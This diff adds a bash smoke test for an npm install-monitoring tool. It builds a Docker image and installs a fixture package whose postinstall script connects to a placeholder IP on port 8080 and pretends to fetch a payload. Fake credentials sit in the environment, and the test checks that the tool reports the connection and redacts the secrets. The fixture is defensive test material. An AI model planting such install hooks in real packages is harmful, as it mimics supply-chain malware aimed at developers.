@@ -1,0 +1,84 @@
+#!/usr/bin/env bash
+set -euo pipefail
+
+ROOT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
+IMAGE_TAG="${ANVIL_NODE_BASE_SMOKE_IMAGE:-anvil-node-base-smoke:local}"
+
+echo "[anvil] Building Node Base image ($IMAGE_TAG)"
+docker build -t "$IMAGE_TAG" -f "$ROOT_DIR/devcontainer-base/Dockerfile" "$ROOT_DIR/devcontainer-base"
+
+echo "[anvil] Running observed install mode inside Node Base image"
+docker run --rm "$IMAGE_TAG" bash -lc '
+set -euo pipefail
+
+WORK_DIR="$(mktemp -d)"
+trap '\''rm -rf "$WORK_DIR"'\'' EXIT
+PROJECT_DIR="$WORK_DIR/project"
+REPORT_DIR="$WORK_DIR/reports"
+
+mkdir -p "$PROJECT_DIR/fixture-package" "$REPORT_DIR"
+cd "$PROJECT_DIR"
+
+cat > package.json <<'\''JSON'\''
+{
+  "name": "anvil-observed-image-smoke",
+  "version": "1.0.0",
+  "private": true,
+  "dependencies": {
+    "observed-install-pkg": "file:./fixture-package"
+  }
+}
+JSON
+
+cat > fixture-package/package.json <<'\''JSON'\''
+{
+  "name": "observed-install-pkg",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "node postinstall.js"
+  }
+}
+JSON
+
+cat > fixture-package/postinstall.js <<'\''JS'\''
+const net = require("node:net");
+
+console.log("observed install attempting http://198.51.100.10:8080/payload.js");
+
+const socket = net.createConnection({ host: "198.51.100.10", port: 8080 });
+let finished = false;
+function finish() {
+  if (finished) return;
+  finished = true;
+  socket.destroy();
+  process.exit(0);
+}
+socket.setTimeout(100, finish);
+socket.on("connect", finish);
+socket.on("error", finish);
+JS
+
+npm install --package-lock-only --ignore-scripts --no-audit --fund=false
+rm -rf node_modules
+
+ANVIL_REPORT_DIR="$REPORT_DIR" \
+NPM_CONFIG_AUDIT=false \
+NPM_TOKEN="image-smoke-token" \
+AWS_SECRET_ACCESS_KEY="image-smoke-secret" \
+  anvil-npm-ci-observed
+
+jq -e ".summary.outboundConnections >= 1" "$REPORT_DIR/ioc-report.json" >/dev/null
+jq -e ".networkSummary.connections[] | select(.address == \"198.51.100.10\" and .port == 8080)" "$REPORT_DIR/ioc-report.json" >/dev/null
+jq -e ".mediumConfidenceFindings[] | select(.code == \"DIRECT_IP_CONNECTION\")" "$REPORT_DIR/ioc-report.json" >/dev/null
+jq -e ".mediumConfidenceFindings[] | select(.code == \"NON_STANDARD_PORT\")" "$REPORT_DIR/ioc-report.json" >/dev/null
+jq -e ".packages[] | select(.name == \"observed-install-pkg\") | .scripts.postinstall == \"node postinstall.js\"" "$REPORT_DIR/lifecycle-scripts.json" >/dev/null
+jq -e ".environment.NPM_TOKEN == \"[redacted]\"" "$REPORT_DIR/environment-snapshot.json" >/dev/null
+jq -e ".environment.AWS_SECRET_ACCESS_KEY == \"[redacted]\"" "$REPORT_DIR/environment-snapshot.json" >/dev/null
+test -s "$REPORT_DIR/ioc-report.md"
+test -s "$REPORT_DIR/npm-install.log"
+test -s "$REPORT_DIR/strace.log"
+
+echo "[anvil] Observed image report captured $(jq -r ".summary.outboundConnections" "$REPORT_DIR/ioc-report.json") outbound connection(s)"
+'
+
+echo "[anvil] Node Base image observed-mode smoke passed."
